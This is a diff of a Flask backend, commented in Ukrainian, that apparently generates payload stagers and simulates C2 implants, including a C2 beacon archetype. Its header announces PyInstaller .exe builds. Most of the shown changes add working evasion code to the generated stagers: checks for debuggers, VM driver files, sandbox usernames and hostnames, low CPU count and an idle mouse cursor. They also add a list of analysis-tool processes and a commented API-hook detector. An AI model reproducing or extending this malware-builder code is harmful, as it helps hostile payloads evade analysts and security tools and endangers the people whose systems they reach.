@@ -1,11 +1,11 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.7.7
-# Призначення: Backend на Flask з розширеними концептуальними техніками ухилення в стейджерах.
-# Оновлення v1.7.7:
-#   - Розширено функцію ec_runtime (evasion checks) у генерованих стейджерах:
-#     - Додано концептуальну перевірку на процеси аналітичних інструментів.
-#     - Додано концептуальну перевірку на хукінг API (Windows).
-#     - Додано концептуальну перевірку активності миші (Windows).
-#   - Оновлено логування для нових технік ухилення.
+# Syntax Flask Backend - Segment SFB-CORE-1.7.8
+# Призначення: Backend на Flask з реальною (концептуальною) генерацією .EXE через PyInstaller.
+# Оновлення v1.7.8:
+#   - Реалізовано фактичний (якщо PyInstaller доступний) виклик PyInstaller для формату 'pyinstaller_exe_windows'.
+#   - Додано перевірку наявності PyInstaller.
+#   - Обробка тимчасових файлів та результатів компіляції.
+#   - Оновлено логування для процесу компіляції.
+#   - Додано імпорт shutil для видалення директорій.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -24,13 +24,14 @@ import xml.etree.ElementTree as ET
 import tempfile 
 import os 
 import uuid 
+import shutil # Для видалення директорій (наприклад, build від PyInstaller)
 
-VERSION_BACKEND = "1.7.7"
+VERSION_BACKEND = "1.7.8"
 
 simulated_implants_be = []
 pending_tasks_for_implants = {} 
 
-CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.7.6)
+CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.7.7)
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
     "openssh 8.2p1": [{"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "sshd in OpenSSH 6.2 through 8.8 allows remote attackers to bypass..."}],
     "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
@@ -63,7 +64,7 @@ def initialize_simulated_implants_be(): # Логіка (без змін)
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань очищено.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.7.6)
+CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.7.7)
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -131,7 +132,7 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.7.6)
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
     "enable_evasion_checks": {"type": bool, "required": False, "default": True}
 }
-CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.7.6)
+CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.7.7)
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
     "demo_file_lister_payload": {"description": "Демо-пейлоад, що 'перелічує' файли...", "template_type": "python_stager_file_lister"},
     "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка (HTTP POST з виконанням завдань)", "template_type": "python_stager_http_c2_beacon"},
@@ -726,7 +727,7 @@ def handle_generate_payload():
             "        o_chars.append(chr(ord(temp_decoded_str[i_char_idx]) ^ ord(key_str[i_char_idx % len(key_str)])))",
             "    return \"\".join(o_chars)",
             "",
-            f"def {evasion_func_name_runtime}():", # Логіка (без змін від v1.7.0)
+            f"def {evasion_func_name_runtime}():", 
             "    print(\"[STAGER_EVASION] Виконання розширених концептуальних перевірок ухилення...\")",
             "    indicators = []",
             "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\", \"emulator\", \"vmware\", \"virtualbox\", \"蜜罐\", \"ताम्बू\", \"песочница\"]",
@@ -734,13 +735,13 @@ def handle_generate_payload():
             "        current_user = os.getlogin().lower()",
             "        if current_user in common_sandbox_users: indicators.append('common_username_detected')",
             "    except Exception: pass",
-            "    try:",
+            "    try:", # Anti-Debugging (Windows)
             "        if os.name == 'nt':",
             "            kernel32 = ctypes.windll.kernel32",
             "            if kernel32.IsDebuggerPresent() != 0:",
             "                indicators.append('debugger_present_win')",
             "    except Exception: pass",
-            "    try:",
+            "    try:", # Time-based evasion
             "        sleep_duration_seconds = random.uniform(1.8, 3.3)",
             "        time_before_sleep = time.monotonic()",
             "        time.sleep(sleep_duration_seconds)",
@@ -749,34 +750,65 @@ def handle_generate_payload():
             "        if elapsed_time < (sleep_duration_seconds * 0.65):",
             "            indicators.append('time_acceleration_heuristic')",
             "    except Exception: pass",
-            "    vm_files_artifacts = [",
+            "    vm_files_artifacts = [", # VM/Sandbox file artifacts
             "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxMouse.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxGuest.sys\",",
             "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmhgfs.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmmouse.sys\",",
-            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vpc-s3.sys\",",
-            "        \"/usr/bin/VBoxClient\", \"/opt/VBoxGuestAdditions-*/init/vboxadd\"",
+            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vpc-s3.sys\", \"/usr/bin/VBoxClient\", \"/opt/VBoxGuestAdditions-*/init/vboxadd\"",
             "    ]",
             "    for vm_file_path in vm_files_artifacts:",
             "        if os.path.exists(vm_file_path):",
             "            indicators.append(f'vm_file_artifact_{os.path.basename(vm_file_path).lower().replace(\".sys\",\"\")}')",
             "            break",
-            "    try:",
+            "    try:", # Hostname check
             "        hostname = socket.gethostname().lower()",
-            "        suspicious_host_keywords = [\"sandbox\", \"virtual\", \"vm-\", \"test\", \"debug\", \"analysis\"]",
+            "        suspicious_host_keywords = [\"sandbox\", \"virtual\", \"vm-\", \"test\", \"debug\", \"analysis\", \"lab\", \"desktop-\", \"DESKTOP-\"]", # Розширено
             "        if any(keyword in hostname for keyword in suspicious_host_keywords):",
             "            indicators.append('suspicious_hostname_keyword')",
             "    except Exception: pass",
-            "    try:",
+            "    try:", # CPU core count
             "        cpu_count = os.cpu_count()",
             "        if cpu_count is not None and cpu_count < 2:",
             "            indicators.append('low_cpu_core_count')",
             "    except Exception: pass",
+            "    try:", # Mouse activity check (Windows)
+            "        if os.name == 'nt':",
+            "            class POINT(ctypes.Structure): _fields_ = [(\"x\", ctypes.c_long), (\"y\", ctypes.c_long)]",
+            "            pt1 = POINT()",
+            "            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt1))",
+            "            time.sleep(random.uniform(0.3, 0.7)) # Невелика пауза",
+            "            pt2 = POINT()",
+            "            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))",
+            "            if pt1.x == pt2.x and pt1.y == pt2.y:",
+            "                 indicators.append('no_mouse_activity_win')",
+            "    except Exception: pass",
+            "    suspicious_processes = ['wireshark.exe', 'procmon.exe', 'procexp.exe', 'ollydbg.exe', 'x64dbg.exe', 'idag.exe', 'idaw.exe', 'fiddler.exe', 'tcpview.exe', 'autoruns.exe']",
+            "    # TODO_SYNTAX: Реалізувати отримання списку процесів (напр., через subprocess tasklist або psutil) та перевірку",
+            "    # for proc_name in suspicious_processes: # Концептуальна перевірка",
+            "    #    if random.random() < 0.05: indicators.append(f'suspicious_process_{proc_name.split(\".\")[0]}')",
+            "    if random.random() < 0.1: indicators.append('simulated_suspicious_process_check')", # Замість реальної перевірки поки що
+            "",
+            "    # TODO_SYNTAX: Концептуальна перевірка на API хукінг (Windows)",
+            "    # critical_dlls_functions = {'kernel32.dll!CreateFileW': b'\\xe9', 'ntdll.dll!NtOpenFile': b'\\xe9'} # JMP instruction",
+            "    # for func_path, hook_byte in critical_dlls_functions.items():",
+            "    #     try:",
+            "    #         dll_name, func_name = func_path.split('!')",
+            "    #         h_module = ctypes.windll.kernel32.GetModuleHandleW(dll_name)",
+            "    #         if h_module:",
+            "    #             func_addr = ctypes.windll.kernel32.GetProcAddress(h_module, func_name.encode('ascii'))",
+            "    #             if func_addr:",
+            "    #                 first_byte = ctypes.cast(func_addr, ctypes.POINTER(ctypes.c_char)).contents.value",
+            "    #                 if first_byte == hook_byte:",
+            "    #                     indicators.append(f'api_hook_suspected_{func_name}')",
+            "    #     except Exception: pass",
+            "    if random.random() < 0.08: indicators.append('simulated_api_hook_check')", # Замість реальної перевірки
+            "",
             "    if indicators:",
             "        print(f\"[STAGER_EVASION] Виявлено індикатори аналітичного середовища: {{', '.join(indicators)}}! Зміна поведінки або вихід.\")",
             "        return True",
             "    print(\"[STAGER_EVASION] Перевірки ухилення пройдені (концептуально).\")",
             "    return False",
             "",
-            f"def {execute_func_name_runtime}(content, arch_type):",
+            f"def {execute_func_name_runtime}(content, arch_type):", # Логіка (без змін від v1.7.6)
             "    print(f\"[PAYLOAD ({{arch_type}})] Ініціалізація логіки пейлоада з контентом (перші 30 байт): '{{str(content)[:30}}}...'\")",
             "    if arch_type == 'demo_c2_beacon_payload':", 
             "        beacon_url = content", 
